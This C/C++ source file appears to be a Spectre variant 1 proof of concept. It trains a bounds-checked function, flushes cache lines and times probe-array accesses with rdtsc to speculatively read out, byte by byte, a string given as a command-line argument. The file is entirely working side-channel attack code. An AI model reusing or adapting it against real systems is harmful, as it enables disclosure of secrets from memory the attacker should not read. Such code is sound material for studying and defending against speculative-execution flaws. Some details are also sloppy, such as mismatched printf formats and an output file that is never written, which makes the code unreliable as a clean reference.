#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <string>
#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

const long cache_line = 8192;
const long N = 10;

char *array1;
char *array2;
size_t array1_size = N;

unsigned long long ceil_access_time;

void calc_average_time() {
char first = array2[0];
unsigned long long sum = 0;
for (volatile rsize_t i = 0; i < 1000; i++) {
__sync_synchronize();
volatile unsigned long long start_time = __rdtsc();
__sync_synchronize();
volatile char byte = array2[0];
__sync_synchronize();
volatile unsigned long long cur_access_time = __rdtsc() - start_time;
sum += cur_access_time;
}
ceil_access_time = sum / 500;
}

char func(unsigned long long x) {
if (x < array1_size) {
return array2[array1[x] * cache_line];
}
return '\0';
}

char attack(unsigned long long address){
while (true) {
for (volatile size_t i = 0; i < 10000; i++) {
volatile char byte = func(0);
}

_mm_clflush(&array1_size);
for (size_t i = 0; i < N; i++) {
_mm_clflush(array1 + i);
}
for (size_t i = 0; i < 256; i++) {
_mm_clflush(array2 + i * cache_line);
}

func(address);

for (volatile size_t i = 0; i < 256; i++) {
__sync_synchronize();
volatile unsigned long long start_time = __rdtsc();
__sync_synchronize();
volatile char byte = array2[i * cache_line];
__sync_synchronize();
volatile unsigned long long cur_access_time = __rdtsc() - start_time;
// printf("%d\n", cur_access_time);
if (cur_access_time <= ceil_access_time) {
printf("%d %c\n", cur_access_time, char(i));
return char(i);
}
}
}
}

int main(int argc, char* argv[]) {
if (argc != 3) {
printf("Please, enter 2 arguments: data (string) and name of output file.\n");
return -1;
}
FILE *out = fopen(argv[2], "w");
if (out == NULL) {
printf("File %s cannot be open.\n", argv[2]);
return -1;
}

array1 = (char *)malloc(N * sizeof(char));
array2 = (char *)malloc(cache_line * 256 * sizeof(char));
memset(array1, 0, N * sizeof(char));
memset(array2, 0xda, cache_line * 256 * sizeof(char));
calc_average_time();
printf("%d\n", ceil_access_time);

char *data = argv[1];
std::string read;
unsigned long long position = (unsigned long long)data - (unsigned long long)array1;
unsigned long long it = 0;
while (true) {
read += attack(position + it);
if (read[read.size() - 1] == '\0') {
break;
} else {
it++;
}
}
printf("%s\n", read.c_str());
free(array1);
free(array2);
fclose(out);
return 0;
}